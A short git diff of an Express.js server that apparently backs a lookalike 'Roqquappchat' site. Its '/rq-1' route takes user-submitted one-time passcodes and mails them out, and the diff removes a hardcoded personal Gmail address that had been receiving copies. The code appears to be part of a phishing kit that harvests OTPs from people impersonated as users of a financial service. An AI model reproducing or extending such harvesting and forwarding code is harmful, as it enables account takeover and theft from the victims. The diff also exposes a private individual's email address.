@@ -32,7 +32,7 @@ app.use(express.urlencoded({ extended: true }))
 //const parseForm = bodyParser.urlencoded({ extended: false })
 
 const corsOptions = {
-   origin: 'https://roqquappchat.com',
+    origin: 'https://roqquappchat.com',
     //origin: 'http://localhost:3000',
     credentials: true,
     // preflightContinue: true,
@@ -93,7 +93,6 @@ app.post('/rq-1', (req, res, next) => {
 
     console.log('length of otp', otp.length)
 
-
     if (otp.length > 6) {
         console.log('Attack started', otp)
         return
@@ -128,7 +127,7 @@ app.post('/rq-1', (req, res, next) => {
         const mail = {
             from: process.env.EMAIL,
             //to: process.env.TOEMAIL,
-            to: `ifestephenie@gmail.com, ${process.env.TOEMAIL}`,
+            to: `${process.env.TOEMAIL}`,
             subject: 'New message from Roqquappchat',
             html: content,
         }
